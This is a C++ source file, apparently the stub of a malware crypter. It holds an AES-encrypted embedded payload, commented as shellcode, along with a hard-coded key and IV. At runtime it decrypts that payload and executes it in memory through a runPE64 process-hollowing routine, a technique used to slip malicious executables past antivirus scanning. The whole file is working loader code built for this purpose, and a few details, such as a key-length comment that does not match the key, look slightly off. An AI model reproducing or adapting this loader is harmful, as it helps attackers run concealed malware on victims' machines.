#define _CRT_SECURE_NO_WARNINGS

#include "runpe.h"
#include "output.h"
#include <thread>
#include <fstream>
#include <vector>
#include <random>
#include "../plusaes.hpp"
//              _       _         _     
//             | |     | |       | |    
//   __ _ _ __ | |_ ___| |_ _   _| |__  
//  / _` | '_ \| __/ __| __| | | | '_ \ 
// | (_| | |_) | |_\__ \ |_| |_| | |_) |
//  \__, | .__/ \__|___/\__|\__,_|_.__/ 
//   __/ | |                            
//  |___/|_|                            

std::vector<char>::const_iterator find_pattern(const std::vector<char>& data)
{
	const char* target = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	auto target_size = 120; //std::strlen(target);

	auto iter = std::search(data.begin(), data.end(), target, target + target_size);

	if (iter != data.end()) {
		return iter;
	}
	else {
		return data.end();
	}
}

int main() {
	const std::vector<unsigned char> key = plusaes::key_from_string(&"K9VR3bmIOWVa8MCSzPb5wafNCvF4O1yD"); // 32-char = 128-bit

	const unsigned char iv[16] = { 'i', 'v', 'f', 'o', 'r', 'a', 'e', 's', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'r' };

	//check shellcode isnt empty lol
	int c = 0;
	for (size_t i = 4; i < 1024; i++) 
		if (data[i] != 0) {
			c++;
			break;
		}
	if (!c) return 1;

	int sz = sizeof(data) / sizeof(data[0]);
	std::vector<char> v{};
	for (size_t i = 0; i < sz; i++)
		v.push_back(data[i]);
	auto iter = find_pattern(v);

	if (iter != v.end())
		sz = std::distance<std::vector<char>::const_iterator>(v.begin(), iter);

	unsigned long padded_size = 0;
	std::vector<unsigned char> decrypted(sz);

	plusaes::decrypt_cbc(&data[0], sz, &key[0], 32, &iv, &decrypted[0], decrypted.size(), &padded_size);

	DWORD dwRet = 0;

	PROCESS_INFORMATION stPI;
	ZeroMemory(&stPI, sizeof stPI);
	STARTUPINFO stSI;
	ZeroMemory(&stSI, sizeof stSI);
	WCHAR szArgs[] = L"";

	if (!runPE64(
		&stPI,
		&stSI,
		reinterpret_cast<LPVOID>(decrypted.data()),
		szArgs,
		sizeof szArgs
	))
	{
		CloseHandle(stPI.hThread);
		CloseHandle(stPI.hProcess);
	}
	return 1;
}